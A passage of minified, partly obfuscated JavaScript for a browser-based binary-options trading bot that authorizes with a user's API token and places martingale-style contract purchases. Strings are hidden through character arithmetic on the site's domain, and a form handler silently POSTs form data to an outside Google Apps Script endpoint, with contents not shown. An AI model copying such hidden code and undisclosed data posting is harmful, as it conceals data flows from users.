  if (c != "none") {
    La.value = c;
  }
  $c(a);
};
const $c = b => {
  Ma.innerHTML = "";
  for (we = 0; we < G.length; we++) {
    if (G[we].split("|")[0] == La.value) {
      H = document.createElement("option");
      H.textContent = G[we].split("|")[1];
      H.value = G[we].split("|")[2];
      Ma.appendChild(H);
    }
  }
  if (b != "none") {
    Ma.value = b;
  }
  qa = Ma.value;
  document.getElementById("lblMarket").innerText = Ma.options[Ma.selectedIndex].text;
  localStorage.setItem("selSymbol", Ma.value);
  dc();
};
const _c = () => {
  Zc("none", "none");
};
const ad = () => {
  $c("none");
};
const bd = () => {
  if (!p && l && m) {
    p = true;
    Cb.disabled = Db.disabled = Eb.disabled = false;
    Cb.style.visibility = Db.style.visibility = Eb.style.visibility = "visible";
    Eb.style.opacity = 1;
    nd("run");
    Nb.innerText = "Robot : " + (localStorage.getItem("mainRobotName") == null ? "-" : localStorage.getItem("mainRobotName"));
    $b("", "Initialized.");
  }
};
const cd = () => {
  l = false;
};
const dd = () => {
  m = false;
  s = false;
};
const ed = () => {
  le.send(JSON.stringify({
    forget: k,
    passthrough: {
      app_id: 63812
    }
  }));
  Mb.innerText = "-";
  le.send(JSON.stringify({
    authorize: Ia.value,
    passthrough: {
      app_id: 63812
    }
  }));
};
const fd = () => {
  s = false;
  // TOLOOK
  // TOLOOK
  // TOLOOK
  setTimeout(() => {
    if (I.readyState == 1) {
      I.send(JSON.stringify({
        authorize: Ja.value,
        passthrough: {
          app_id: 63812
        }
      }));
    } else {
      fd();
    }
  }, 5000);
};
const gd = b => {
  return b[Math.floor(Math.random() * b.length)];
};
const hd = (d, a, e, f, g, h, i, j, k, l, m, p, q, r, s, t, u, v, w) => {
  if (xe) {
    return;
  }
  od(2);
  ve = i == "rt" ? Math.floor(Math.random() * 10) + 1 : h;
  c = i == "rt" ? "t" : i;
  if (c == "t") {
    b = g.includes("1HZ") ? 1 : 2;
  } else if (c == "s") {
    b = 1;
  } else if (c == "m") {
    b = 60;
  } else if (c == "h") {
    b = 3600;
  } else if (c == "d") {
    b = 86400;
  }
  if (d == "master") {
    C = le;
  } else if (d == "slave") {
    C = I;
  }
  ;
  if (a == "manual") {
    z = e;
  }
  ;
  if (["CALL", "PUT", "CALLE", "PUTE", "ONETOUCH", "NOTOUCH", "DIGITDIFF", "DIGITMATCH", "DIGITOVER", "DIGITUNDER", "VANILLALONGCALL", "VANILLALONGPUT", "TURBOSLONG", "TURBOSSHORT"].includes(f)) {
    let d;
    if (["CALL", "PUT", "CALLE", "PUTE", "ONETOUCH", "NOTOUCH", "VANILLALONGCALL", "VANILLALONGPUT", "TURBOSLONG", "TURBOSSHORT"].includes(f)) {
      d = j;
    } else if (["DIGITDIFF", "DIGITMATCH"].includes(f)) {
      d = m;
    } else if (["DIGITOVER"].includes(f)) {
      d = p;
    } else if (["DIGITUNDER"].includes(f)) {
      d = q;
    }
    if (["CALL", "PUT", "CALLE", "PUTE"].includes(f) && (d == "+0" || d == "-0" || d == 0)) {
      $b("", (C == I ? "[Virtual] " : "") + "Purchasing " + f + " [stake: " + parseFloat(z).toFixed(2) + ", duration: " + ve + c + ", " + g + "]");
      C.send(JSON.stringify({
        subscribe: 1,
        buy: 1,
        parameters: {
          amount: parseFloat(z).toFixed(2),
          basis: "stake",
          contract_type: f,
          currency: C == I ? o : n,
          duration: ve,
          duration_unit: c,
          symbol: g
        },
        price: 999999,
        passthrough: {
          app_id: 18376,
          tempDuration: ve,
          tempDetikPengali: b
        }
      }));
    } else {
      $b("", (C == I ? "[Virtual] " : "") + "Purchasing " + f + " " + d + " [stake: " + parseFloat(z).toFixed(2) + ", duration: " + ve + c + ", " + g + "]");
      C.send(JSON.stringify({
        subscribe: 1,
        buy: 1,
        parameters: {
          amount: parseFloat(z).toFixed(2),
          barrier: d,
          basis: "stake",
          contract_type: f,
          currency: C == I ? o : n,
          duration: ve,
          duration_unit: c,
          symbol: g
        },
        price: 999999,
        passthrough: {
          app_id: 63812,
          tempDuration: ve,
          tempDetikPengali: b
        }
      }));
    }
  } else if (["EXPIRYRANGE", "EXPIRYMISS", "RANGE", "UPORDOWN"].includes(f)) {
    $b("", (C == I ? "[Virtual] " : "") + "Purchasing " + f + " " + k + " " + l + " [stake: " + parseFloat(z).toFixed(2) + ", duration: " + ve + c + ", " + g + "]");
    C.send(JSON.stringify({
      subscribe: 1,
      buy: 1,
      parameters: {
        amount: parseFloat(z).toFixed(2),
        barrier: k,
        barrier2: l,
        basis: "stake",
        contract_type: f,
        currency: C == I ? o : n,
        duration: ve,
        duration_unit: c,
        symbol: g
      },
      price: 999999,
      passthrough: {
        app_id: 63812,
        tempDuration: ve,
        tempDetikPengali: b
      }
    }));
  } else if (["ASIANU", "ASIAND", "DIGITEVEN", "DIGITODD", "RESETCALL", "RESETPUT", "RUNHIGH", "RUNLOW"].includes(f)) {
    $b("", (C == I ? "[Virtual] " : "") + "Purchasing " + f + " [stake: " + parseFloat(z).toFixed(2) + ", duration: " + ve + c + ", " + g + "]");
    C.send(JSON.stringify({
      subscribe: 1,
      buy: 1,
      parameters: {
        amount: parseFloat(z).toFixed(2),
        basis: "stake",
        contract_type: f,
        currency: C == I ? o : n,
        duration: ve,
        duration_unit: c,
        symbol: g
      },
      price: 999999,
      passthrough: {
        app_id: 63812,
        tempDuration: ve,
        tempDetikPengali: b
      }
    }));
  } else if (["LBFLOATPUT", "LBFLOATCALL", "LBHIGHLOW"].includes(f)) {
    $b("", (C == I ? "[Virtual] " : "") + "Purchasing " + f + " [multiplier: " + r + ", duration: " + ve + c + ", " + g + "]");
    C.send(JSON.stringify({
      subscribe: 1,
      buy: 1,
      parameters: {
        amount: parseFloat(z).toFixed(2),
        multiplier: r,
        contract_type: f,
        currency: C == I ? o : n,
        duration: ve,
        duration_unit: c,
        symbol: g
      },
      price: 999999,
      passthrough: {
        app_id: 63812,
        tempDuration: ve,
        tempDetikPengali: b
      }
    }));
  } else if (["TICKHIGH", "TICKLOW"].includes(f)) {
    $b("", (C == I ? "[Virtual] " : "") + "Purchasing " + f + " " + s + " [stake: " + parseFloat(z).toFixed(2) + ", duration: " + ve + c + ", " + g + "]");
    C.send(JSON.stringify({
      subscribe: 1,
      buy: 1,
      parameters: {
        amount: parseFloat(z).toFixed(2),
        selected_tick: s,
        basis: "stake",
        contract_type: f,
        currency: C == I ? o : n,
        duration: ve,
        duration_unit: c,
        symbol: g
      },
      price: 999999,
      passthrough: {
        app_id: 63812,
        tempDuration: ve,
        tempDetikPengali: b
      }
    }));
  } else if (["ACCU"].includes(f)) {
    $b("", (C == I ? "[Virtual] " : "") + "Purchasing " + f + " [stake: " + parseFloat(z).toFixed(2) + ", growth rate: " + t + "%, take profit: " + v + ", " + g + "]");
    C.send(JSON.stringify({
      subscribe: 1,
      buy: 1,
      parameters: {
        amount: parseFloat(z).toFixed(2),
        growth_rate: t / 100,
        limit_order: {
          take_profit: v
        },
        basis: "stake",
        contract_type: f,
        currency: C == I ? o : n,
        symbol: g
      },
      price: 999999,
      passthrough: {
        app_id: 63812,
        tempDuration: ve,
        tempDetikPengali: b
      }
    }));
  } else if (["MULTUP", "MULTDOWN"].includes(f)) {
    $b("", (C == I ? "[Virtual] " : "") + "Purchasing " + f + " x" + u + " [stake: " + parseFloat(z).toFixed(2) + ", TP: " + v + ", SL: " + w + ", " + g + "]");
    C.send(JSON.stringify({
      subscribe: 1,
      buy: 1,
      parameters: {
        amount: parseFloat(z).toFixed(2),
        multiplier: u,
        limit_order: {
          take_profit: v,
          stop_loss: w
        },
        basis: "stake",
        contract_type: f,
        currency: C == I ? o : n,
        symbol: g
      },
      price: 999999,
      passthrough: {
        app_id: 63812,
        tempDuration: ve,
        tempDetikPengali: b
      }
    }));
  }
};
const id = () => {
  C.send(JSON.stringify({
    sell: u[ra],
    price: 0
  }));
};
const jd = String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 21) + "bS" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "ck" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 21) + "t('" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(10) + 3) + bc;
const kd = (a, b, c, d, e, f, g, h, i, j, k, l, m) => {
  od(4);
  x = u.indexOf(a);
  if (!v.includes(a) && (c >= 0 || b === "w" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "n")) {
    v.push(a);
    Ab[x].cells[3].innerText = l;
    Ab[x].cells[4].innerText = d;
    Ab[x].cells[5].innerText = c;
    Ab[x].cells[5].style.color = "#0f0";
    Jb.innerText = v.length;
    A += c;
    Hb.innerText = (Hb.innerText * 1 + d).toFixed(2);
    Ib.innerText = (Ib.innerText * 1 + e).toFixed(2);
    Lb.innerText = A.toFixed(2);
    Lb.style.color = A > 0 ? "#0f0" : A < 0 ? "#f44336" : "#fff";
    t = 0;
    va++;
    if (Ya.checked && Za.value * 1 != 0 && A.toFixed(2) * 1 >= Za.value * 1) {
      if (Cb.src.split("/").pop() == "icon_stop.png") {
        Cb.click();
      }
      $b("#0f0", "TARGET PROFIT REACHED.");
      // TOLOOK
      // TOLOOK
      // TOLOOK
      setTimeout(() => {
        alert("TARGET PROFIT REACHED.");
      }, 500);
    } else if (ab.checked && bb.value * 1 != 0 && Jb.innerText * 1 >= bb.value * 1) {
      if (Cb.src.split("/").pop() == "icon_stop.png") {
        Cb.click();
      }
      $b("#0f0", "NUMBER OF WIN(S) REACHED.");
      // TOLOOK
      // TOLOOK
      // TOLOOK
      setTimeout(() => {
        alert("NUMBER OF WIN(S) REACHED.");
      }, 500);
    } else if (eb.checked && fb.value * 1 != 0 && Gb.innerText * 1 >= fb.value * 1) {
      if (Cb.src.split("/").pop() == "icon_stop.png") {
        Cb.click();
      }
      $b("", "NUMBER OF RUN(S) REACHED.");
      // TOLOOK
      // TOLOOK
      // TOLOOK
      setTimeout(() => {
        alert("NUMBER OF RUN(S) REACHED.");
      }, 500);
    } else if (gb.checked && hb.value * 1 != 0 && va >= hb.value * 1) {
      if (Cb.src.split("/").pop() == "icon_stop.png") {
        Cb.click();
      }
      $b("#0f0", "WIN(S) IN A ROW REACHED.");
      // TOLOOK
      // TOLOOK
      // TOLOOK
      setTimeout(() => {
        alert("WIN(S) IN A ROW REACHED.");
      }, 500);
    } else {
      if (["smartmartingale", "smartcyclestake"].includes(Na.value)) {
        if (Wa.checked) {
          if (A >= B) {
            B = A;
            z = _d();
          }
        } else {
          z = _d();
        }
      }
      D = Date.now() + (mb.checked ? nb.value * 1000 : 0);
    }
  } else if (!w.includes(a) && (c < 0 || b === "l" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "st")) {
    w.push(a);
    Ab[x].cells[3].innerText = l;
    Ab[x].cells[4].innerText = d;
    Ab[x].cells[5].innerText = c;
    Ab[x].cells[5].style.color = "#f44336";
    Kb.innerText = w.length;
    A += c;
    Hb.innerText = (Hb.innerText * 1 + d).toFixed(2);
    Ib.innerText = (Ib.innerText * 1 + e).toFixed(2);
    Lb.innerText = A.toFixed(2);
    Lb.style.color = A > 0 ? "#0f0" : A < 0 ? "#f44336" : "#fff";
    va = 0;
    wa++;
    if ($a.checked && _a.value * 1 != 0 && A.toFixed(2) * 1 <= -(_a.value * 1)) {
      if (Cb.src.split("/").pop() == "icon_stop.png") {
        Cb.click();
      }
      $b("#f44336", "STOP LOSS HIT.");
      // TOLOOK
      // TOLOOK
      // TOLOOK
      setTimeout(() => {
        alert("STOP LOSS HIT.");
      }, 500);
    } else if (cb.checked && db.value * 1 != 0 && Kb.innerText * 1 >= db.value * 1) {
      if (Cb.src.split("/").pop() == "icon_stop.png") {
        Cb.click();
      }
      $b("#f44336", "NUMBER OF LOSS(ES) REACHED.");
      // TOLOOK
      // TOLOOK
      // TOLOOK
      setTimeout(() => {
        alert("NUMBER OF LOSS(ES) REACHED.");
      }, 500);
    } else if (eb.checked && fb.value * 1 != 0 && Gb.innerText * 1 >= fb.value * 1) {
      if (Cb.src.split("/").pop() == "icon_stop.png") {
        Cb.click();
      }
      $b("", "NUMBER OF RUN(S) REACHED.");
      // TOLOOK
      // TOLOOK
      // TOLOOK
      setTimeout(() => {
        alert("NUMBER OF RUN(S) REACHED.");
      }, 500);
    } else if (ib.checked && jb.value * 1 != 0 && wa >= jb.value * 1) {
      if (Cb.src.split("/").pop() == "icon_stop.png") {
        Cb.click();
      }
      $b("#f44336", "LOSS(ES) IN A ROW REACHED.");
      // TOLOOK
      // TOLOOK
      // TOLOOK
      setTimeout(() => {
        alert("LOSS(ES) IN A ROW REACHED.");
      }, 500);
    } else {
      z = ae(Math.abs(c));
      D = Date.now() + (ob.checked ? pb.value * 1000 : 0);
    }
  }
  ee(d, e, c, f, g, h, i, j, k, l, m, b, false);
  na();
  clearTimeout(te[u.indexOf(a)]);
  clearTimeout(ue[u.indexOf(a)]);
  u[u.indexOf(a)] = 0;
};
const ld = (a, b, c, d, e, f, g, h, i, j, k, l, m) => {
  od(4);
  if (a != y) {
    x = u.indexOf(a);
    Ab[x].cells[3].innerText = l;
    if (c >= 0 || b === "w" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "n") {
      Ab[x].cells[5].innerText = "Virtual Win";
      Ab[x].cells[5].style.color = "#0f0";
      t = 0;
      D = Date.now() + (mb.checked ? nb.value * 1000 : 0);
    } else if (c < 0 || b === "l" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "st") {
      Ab[x].cells[5].innerText = "Virtual Lose";
      Ab[x].cells[5].style.color = "#f44336";
      t++;
      if (kb.checked) {
        $b("", "[Virtual] LOSE #" + t + "/" + lb.value);
      }
      ;
      D = Date.now() + (ob.checked ? pb.value * 1000 : 0);
    }
    y = a;
    ee(d, e, c, f, g, h, i, j, k, l, m, b, true);
    na();
    clearTimeout(te[u.indexOf(a)]);
    clearTimeout(ue[u.indexOf(a)]);
    u[u.indexOf(a)] = 0;
  }
};
const md = b => {
  console.log("doPLANB: " + b);
  if (C.readyState != 1) {
    ue[u.indexOf(b)] = // TOLOOK
    // TOLOOK
    // TOLOOK
    setTimeout(() => {
      md(b);
    }, 5000);
    return;
  }
  if (u.indexOf(b) > -1) {
    if (navigator.onLine) {
      C.send(JSON.stringify({
        forget_all: "prop" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "sal_open_c" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "ntract",
        passthrough: {
          app_id: 63812
        }
      }));
      C.send(JSON.stringify({
        subscribe: 1,
        proposal_open_contract: 1,
        contract_id: b,
        passthrough: {
          app_id: 63812
        }
      }));
    }
    ue[u.indexOf(b)] = // TOLOOK
    // TOLOOK
    // TOLOOK
    setTimeout(() => {
      md(b);
    }, 5000);
  } else {}
};
const nd = b => {
  Cb.src = Db.src = "image/icon_" + b + ".png";
  Eb.innerHTML = "<img src=\"image/icon_" + b + "2.png\" style=\"height: 30px;\">&nbsp;&nbsp;" + (b == "run" ? "Run" : "Stop") + " Robot";
};
window.onbeforeunload = function (b) {
  return "Are You sure ?";
};
const od = b => {
  for (we = 1; we <= 4; we++) {
    if (we <= b) {
      yb[we].className = "stepper-item completed";
    } else {
      yb[we].className = "stepper-item active";
    }
    if (we == b) {
      yb[we].querySelector(".step-counter").classList.add("pulse");
    } else {
      yb[we].querySelector(".step-counter").classList.remove("pulse");
    }
  }
};
Ob.addEventListener("submit", c => {
  c.preventDefault();
  let a = new FormData(Ob);
  fetch("https://script.google.com/macros/s/AKfycbwx-8PzrCYl0UkYT5_II5cu7YtkEaXHp6QqKtXFO_ncW7Cr_aZHZJb-Kc7o4bf1mFyM/exec", {
    mode: "no-cors",
    method: "POST",
    body: a
  }).then(b => {}).then(b => {}).catch(function (b) {
    console.log("Request failed", b);
  });
  return true;
});
const pd = (h, a, b, c, d, e, f) => {
  Pb.value = h;
  Qb.value = a;
  Rb.value = b;
  Sb.value = c;
  Tb.value = d;
  Ub.value = "block";
  Vb.value = e;
  Wb.value = f;
  Xb.click();
};
const qd = b => {
  document.getElementById("div_thelast10digits").style.display = "none";
  document.getElementById("div_digitstatistic").style.display = "none";
  document.getElementById("div_thelast20digitscaterzian").style.display = "none";
  document.getElementById("div_thelast20digitsevenodd").style.display = "none";
  document.getElementById("div_evenvsodd").style.display = "none";
  document.getElementById("div_overvsunder").style.display = "none";
  document.getElementById("div_thelast10ticks").style.display = "none";
  document.getElementById("div_thelast20tickworm").style.display = "none";
  document.getElementById("div_risevsfall").style.display = "none";
  document.getElementById("div_tick_Trisma").style.display = "none";
  document.getElementById("div_detail3ticks").style.display = "none";
  document.getElementById("div_thelast10candles").style.display = "none";
  document.getElementById("div_continuousindices").style.display = "none";
  document.getElementById("div_ihaveanidea").style.display = "none";
  document.getElementById("div_comingsoon").style.display = "none";
  document.getElementById("div_" + b).style.display = "block";
};
qd(qb.value);
function rd(f, a) {
  const b = JSON.stringify(f);
  const c = document.createElement("a");
  const d = new Blob([b], {
    type: "text/plain"
  });
  c.href = URL.createObjectURL(d);
  c.download = a;
  document.body.appendChild(c);
  c.click();
  c.remove();
}
function sd(c) {
  let a = new FileReader();
  a.onload = function () {
    Blockly.serialization.workspaces.load(JSON.parse(a.result), Blockly.getMainWorkspace());
    document.getElementById("input_file").value = "";
  };
  a.readAsText(c);
}
function td(j, a, b) {
  var c = [];
  var k = [];
  var l;
  var m;
  var n;
  var o;
  if (a != "") {
    c.push(a);
  }
  n = document.querySelectorAll("#" + j + " tr");
  for (l = 0; l < n.length; l++) {
    o = n[l].querySelectorAll("td,th");
    k = [];
    for (m = 0; m < o.length; m++) {
      k.push(o[m].innerText);
    }
    c.push(k.join(","));
  }
  c = c.join("\n");
  ud(c, b);
}
function ud(f, a) {
  var b = new Blob([f], {
    type: "text/csv"
  });
  var c = document.createElement("a");
  c.download = a;
  var d = window.URL.createObjectURL(b);
  c.href = d;
  c.style.display = "none";
  document.body.appendChild(c);
  c.click();
  document.body.removeChild(c);
}
var vd = document.getElementById("toolbox");
var wd = {
  toolbox: vd,
  collapse: true,
  comments: true,
  disable: true,
  maxBlocks: Infinity,
  trashcan: false,
  horizontalLayout: false,
  toolboxPosition: "start",
  css: true,
  media: "https://blockly-demo.appspot.com/static/media/",
  rtl: false,
  scrollbars: true,
  sounds: true,
  oneBasedIndex: true,
  zoom: {
    controls: true,
    wheel: false,
    startScale: 1,
    maxScale: 3,
    minScale: 0.3,
    scaleSpeed: 1.2,
    pinch: true
  },
  theme: Blockly.Theme.defineTheme("dark", {
    base: Blockly.Themes.Classic,
    blockStyles: {
      logic_blocks: {
        colourPrimary: "#3e3e3e"
      },
      math_blocks: {
        colourPrimary: "#3e3e3e"
      },
      text_blocks: {
        colourPrimary: "#3e3e3e"
      },
      list_blocks: {
        colourPrimary: "#3e3e3e"
      },
      variable_blocks: {
        colourPrimary: "#3e3e3e"
      },
      procedure_blocks: {
        colourPrimary: "#3e3e3e"
      },
      loop_blocks: {
        colourPrimary: "#3e3e3e"
      }
    },
    componentStyles: {
      workspaceBackgroundColour: "#1e1e1e",
      toolboxBackgroundColour: "blackBackground",
      toolboxForegroundColour: "#fff",
      flyoutBackgroundColour: "#252526",
      flyoutForegroundColour: "#ccc",
      flyoutOpacity: 1,
      scrollbarColour: "#797979",
      insertionMarkerColour: "#222",
      insertionMarkerOpacity: 0.3,
      scrollbarOpacity: 0.4,
      cursorColour: "#d0d0d0",
      blackBackground: "#2a2a2a"
    }
  })
};
var xd = Blockly.inject(blocklyDiv, wd);
xd.addChangeListener(Blockly.Events.disableOrphans);
var yd = document.getElementById("workspaceBlocks");
Blockly.Xml.domToWorkspace(yd, xd);
let zd = [["Active Market", "activemarket"], ["Current Market [Multi Market: Continuous Indices]", "mainMarket_continuousindices"], ["Continuous Indices:Volatility 10 (1s) Index", "1HZ10V|Volatility 10 (1s) Index"], ["Continuous Indices:Volatility 10 Index", "R_10|Volatility 10 Index"], ["Continuous Indices:Volatility 25 (1s) Index", "1HZ25V|Volatility 25 (1s) Index"], ["Continuous Indices:Volatility 25 Index", "R_25|Volatility 25 Index"], ["Continuous Indices:Volatility 50 (1s) Index", "1HZ50V|Volatility 50 (1s) Index"], ["Continuous Indices:Volatility 50 Index", "R_50|Volatility 50 Index"], ["Continuous Indices:Volatility 75 (1s) Index", "1HZ75V|Volatility 75 (1s) Index"], ["Continuous Indices:Volatility 75 Index", "R_75|Volatility 75 Index"], ["Continuous Indices:Volatility 100 (1s) Index", "1HZ100V|Volatility 100 (1s) Index"], ["Continuous Indices:Volatility 100 Index", "R_100|Volatility 100 Index"], ["Continuous Indices:Volatility 150 (1s) Index", "1HZ150V|Volatility 150 (1s) Index"], ["Continuous Indices:Volatility 250 (1s) Index", "1HZ250V|Volatility 250 (1s) Index"], ["Daily Reset Indices:Bear Market Index", "RDBEAR|Bear Market Index"], ["Daily Reset Indices:Bull Market Index", "RDBULL|Bull Market Index"], ["Jump Indices:Jump 10 Index", "JD10|Jump 10 Index"], ["Jump Indices:Jump 25 Index", "JD25|Jump 25 Index"], ["Jump Indices:Jump 50 Index", "JD50|Jump 50 Index"], ["Jump Indices:Jump 75 Index", "JD75|Jump 75 Index"], ["Jump Indices:Jump 100 Index", "JD100|Jump 100 Index"], ["Step Indices:Step Index", "stpRNG|Step Index"], ["Crash/Boom Indices:Crash 300 Index", "CRASH300N|Crash 300 Index"], ["Crash/Boom Indices:Crash 500 Index", "CRASH500|Crash 500 Index"], ["Crash/Boom Indices:Crash 1000 Index", "CRASH1000|Crash 1000 Index"], ["Crash/Boom Indices:Boom 300 Index", "BOOM300N|Boom 300 Index"], ["Crash/Boom Indices:Boom 500 Index", "BOOM500|Boom 500 Index"], ["Crash/Boom Indices:Boom 1000 Index", "BOOM1000|Boom 1000 Index"], ["Major Pairs:AUD/JPY", "frxAUDJPY|AUD/JPY"], ["Major Pairs:AUD/USD", "frxAUDUSD|AUD/USD"], ["Major Pairs:EUR/AUD", "frxEURAUD|EUR/AUD"], ["Major Pairs:EUR/CHF", "frxEURCHF|EUR/CHF"], ["Major Pairs:EUR/GBP", "frxEURGBP|EUR/GBP"], ["Major Pairs:EUR/JPY", "frxEURJPY|EUR/JPY"], ["Major Pairs:EUR/USD", "frxEURUSD|EUR/USD"], ["Major Pairs:GBP/AUD", "frxGBPAUD|GBP/AUD"], ["Major Pairs:GBP/JPY", "frxGBPJPY|GBP/JPY"], ["Major Pairs:GBP/USD", "frxGBPUSD|GBP/USD"], ["Major Pairs:USD/CAD", "frxUSDCAD|USD/CAD"], ["Major Pairs:USD/CHF", "frxUSDCHF|USD/CHF"], ["Major Pairs:USD/JPY", "frxUSDJPY|USD/JPY"], ["Minor Pairs:AUD/CAD", "frxAUDCAD|AUD/CAD"], ["Minor Pairs:AUD/CHF", "frxAUDCHF|AUD/CHF"], ["Minor Pairs:AUD/NZD", "frxAUDNZD|AUD/NZD"], ["Minor Pairs:EUR/NZD", "frxEURNZD|EUR/NZD"], ["Minor Pairs:GBP/CAD", "frxGBPCAD|GBP/CAD"], ["Minor Pairs:GBP/CHF", "frxGBPCHF|GBP/CHF"], ["Minor Pairs:GBP/NOK", "frxGBPNOK|GBP/NOK"], ["Minor Pairs:GBP/NZD", "frxGBPNZD|GBP/NZD"], ["Minor Pairs:NZD/JPY", "frxNZDJPY|NZD/JPY"], ["Minor Pairs:NZD/USD", "frxNZDUSD|NZD/USD"], ["Minor Pairs:USD/MXN", "frxUSDMXN|USD/MXN"], ["Minor Pairs:USD/NOK", "frxUSDNOK|USD/NOK"], ["Minor Pairs:USD/PLN", "frxUSDPLN|USD/PLN"], ["Minor Pairs:USD/SEK", "frxUSDSEK|USD/SEK"], ["Asian indices:Australia 200", "OTC_AS51|Australia 200"], ["Asian indices:Hong Kong 50", "OTC_HSI|Hong Kong 50"], ["Asian indices:Japan 225", "OTC_N225|Japan 225"], ["European indices:Euro 50", "OTC_SX5E|Euro 50"], ["European indices:France 40", "OTC_FCHI|France 40"], ["European indices:Germany 40", "OTC_GDAXI|Germany 40"], ["European indices:Netherlands 25", "OTC_AEX|Netherlands 25"], ["European indices:Swiss 20", "OTC_SSMI|Swiss 20"], ["European indices:UK 100", "OTC_FTSE|UK 100"], ["American indices:US 500", "OTC_SPC|US 500"], ["American indices:US Tech 100", "OTC_NDX|US Tech 100"], ["American indices:Wall Street 30", "OTC_DJI|Wall Street 30"], ["Forex Basket:AUD Basket", "WLDAUD|AUD Basket"], ["Forex Basket:EUR Basket", "WLDEUR|EUR Basket"], ["Forex Basket:GBP Basket", "WLDGBP|GBP Basket"], ["Forex Basket:USD Basket", "WLDUSD|USD Basket"], ["Commodities Basket:Gold Basket", "WLDXAU|Gold Basket"], ["Metals:Gold/USD", "frxXAUUSD|Gold/USD"], ["Metals:Palladium/USD", "frxXPDUSD|Palladium/USD"], ["Metals:Platinum/USD", "frxXPTUSD|Platinum/USD"], ["Metals:Silver/USD", "frxXAGUSD|Silver/USD"], ["Cryptocurrencies:BTC/USD", "cryBTCUSD|BTC/USD"], ["Cryptocurrencies:ETH/USD", "cryETHUSD|ETH/USD"]];
let Ad = [["Auto", "auto"], ["Master", "master"], ["Slave", "slave"]];
let Bd = [["Auto", "auto"], ["Manual", "manual"]];
let Cd = [["Active Market", "activemarket"], ["Current Market [Multi Market: Continuous Indices]", "mainMarket_continuousindices"], ["Continuous Indices:Volatility 10 (1s) Index", "1HZ10V|Volatility 10 (1s) Index"], ["Continuous Indices:Volatility 10 Index", "R_10|Volatility 10 Index"], ["Continuous Indices:Volatility 25 (1s) Index", "1HZ25V|Volatility 25 (1s) Index"], ["Continuous Indices:Volatility 25 Index", "R_25|Volatility 25 Index"], ["Continuous Indices:Volatility 50 (1s) Index", "1HZ50V|Volatility 50 (1s) Index"], ["Continuous Indices:Volatility 50 Index", "R_50|Volatility 50 Index"], ["Continuous Indices:Volatility 75 (1s) Index", "1HZ75V|Volatility 75 (1s) Index"], ["Continuous Indices:Volatility 75 Index", "R_75|Volatility 75 Index"], ["Continuous Indices:Volatility 100 (1s) Index", "1HZ100V|Volatility 100 (1s) Index"], ["Continuous Indices:Volatility 100 Index", "R_100|Volatility 100 Index"]];
Blockly.defineBlocksWithJsonArray([{
  type: "runonceatstart",
  message0: "%1 1. Run once at start: %2 %3",
  args0: [{
    type: "field_image",
    src: "https://block.ezbinarybot.com/image/icon_start.png",
    width: 25,
    height: 25,
    alt: "*",
    flipRtl: false
  }, {
    type: "input_end_row"
  }, {
    type: "input_statement",
    name: "statement_runonceatstart"
  }],
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.runonceatstart = function (e, a) {
  var b = a.statementToCode(e, "statement_runonceatstart");
  var c = "func$1$9$8$7$RunOnceAtStart=()=>{izinRun2=false;" + b + ";stakeNow=getStakeBegin();sudahRunOnceAtStart=true;timeMayOP=Date.now()+600;}";
  return c;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchaseconditions",
  message0: "%1 2. Purchase conditions %2 %3",
  args0: [{
    type: "field_image",
    src: "https://block.ezbinarybot.com/image/icon_purchase.png",
    width: 25,
    height: 25,
    alt: "*",
    flipRtl: false
  }, {
    type: "input_end_row"
  }, {
    type: "input_statement",
    name: "statement_purchaseconditions"
  }],
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchaseconditions = function (e, a) {
  var b = a.statementToCode(e, "statement_purchaseconditions");
  var c = "func$1$9$8$7$PurchaseConditions=()=>{if(izinRun2){izinRun2=false;" + b + "};}";
  return c;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchaseconditions_continuousindices",
  message0: "%1 2. Purchase conditions [Multi Market: Continuous Inidices] %2 %3",
  args0: [{
    type: "field_image",
    src: "https://block.ezbinarybot.com/image/icon_purchase.png",
    width: 25,
    height: 25,
    alt: "*",
    flipRtl: false
  }, {
    type: "input_end_row"
  }, {
    type: "input_statement",
    name: "statement_purchaseconditions"
  }],
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchaseconditions_continuousindices = function (e, a) {
  var b = a.statementToCode(e, "statement_purchaseconditions");
  var c = "func$1$9$8$7$PurchaseConditions_continuousindices=()=>{" + b + "}";
  return c;
};
Blockly.defineBlocksWithJsonArray([{
  type: "currentmarket_continuousindices",
  message0: "Current Market [Multi Market: Continuous Indices]",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.currentmarket_continuousindices = function (c, a) {
  return ["mainMarket_continuousindices", Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "1001tickslist_continuousindices",
  message0: "1001 Ticks List [Multi Market: Continuous Indices]",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock["1001tickslist_continuousindices"] = function (c, a) {
  return ["mainTickArray_continuousindices", Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "1001lastdigitlist_continuousindices",
  message0: "1001 Last Digit List [Multi Market: Continuous Indices]",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
